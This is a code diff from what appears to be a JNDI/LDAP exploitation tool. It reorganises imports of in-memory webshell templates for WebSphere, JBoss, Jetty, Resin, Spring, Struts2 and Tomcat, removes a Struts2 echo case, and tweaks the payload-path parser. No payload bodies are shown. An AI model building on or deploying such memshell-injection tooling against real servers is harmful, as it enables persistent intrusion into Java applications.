@@ -8,26 +8,26 @@ import com.qi4l.jndi.gadgets.Config.Config;
 import com.qi4l.jndi.gadgets.utils.InjShell;
 import com.qi4l.jndi.gadgets.utils.Util;
 import com.qi4l.jndi.template.*;
-import com.qi4l.jndi.template.Websphere.WSFMSFromThread;
-import com.qi4l.jndi.template.Websphere.WebsphereMemshellTemplate;
-import com.qi4l.jndi.template.Websphere.websphereEcho;
+import com.qi4l.jndi.template.memshell.Websphere.WSFMSFromThread;
+import com.qi4l.jndi.template.memshell.Websphere.WebsphereMemshellTemplate;
+import com.qi4l.jndi.template.memshell.Websphere.websphereEcho;
 import com.qi4l.jndi.template.echo.*;
-import com.qi4l.jndi.template.jboss.JBFMSFromContextF;
-import com.qi4l.jndi.template.jboss.JBSMSFromContextS;
+import com.qi4l.jndi.template.memshell.jboss.JBFMSFromContextF;
+import com.qi4l.jndi.template.memshell.jboss.JBSMSFromContextS;
 import com.qi4l.jndi.template.echo.JbossEcho;
-import com.qi4l.jndi.template.jetty.JFMSFromJMXF;
-import com.qi4l.jndi.template.jetty.JSMSFromJMXS;
+import com.qi4l.jndi.template.memshell.jetty.JFMSFromJMXF;
+import com.qi4l.jndi.template.memshell.jetty.JSMSFromJMXS;
 import com.qi4l.jndi.template.echo.jettyEcho;
-import com.qi4l.jndi.template.resin.RFMSFromThreadF;
-import com.qi4l.jndi.template.resin.RSMSFromThreadS;
+import com.qi4l.jndi.template.memshell.resin.RFMSFromThreadF;
+import com.qi4l.jndi.template.memshell.resin.RSMSFromThreadS;
 import com.qi4l.jndi.template.echo.resinEcho;
-import com.qi4l.jndi.template.spring.SpringControllerMS;
-import com.qi4l.jndi.template.spring.SpringInterceptorMS;
-import com.qi4l.jndi.template.struts2.Struts2ActionMS;
-import com.qi4l.jndi.template.tomcat.*;
+import com.qi4l.jndi.template.memshell.spring.SpringControllerMS;
+import com.qi4l.jndi.template.memshell.spring.SpringInterceptorMS;
+import com.qi4l.jndi.template.memshell.struts2.Struts2ActionMS;
 import com.qi4l.jndi.template.echo.weblogicEcho;
 import com.qi4l.jndi.gadgets.utils.ClassNameUtils;
 import com.qi4l.jndi.gadgets.utils.HexUtils;
+import com.qi4l.jndi.template.memshell.tomcat.*;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -95,9 +95,6 @@ public class BasicController implements LdapController {
                     break;
                 case resinecho:
                     className = resinEcho.class.getName();
-                    break;
-                case struts2echo:
-                    className = Struts2Echo.class.getName();
                     break;
                 case jbossecho:
                     className = JbossEcho.class.getName();
@@ -339,6 +336,7 @@ public class BasicController implements LdapController {
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
         try {
+            base = base.replace('\\','/');
             int fistIndex   = base.indexOf("/");
             int secondIndex = base.indexOf("/", fistIndex + 1);
             if (secondIndex < 0) secondIndex = base.length();
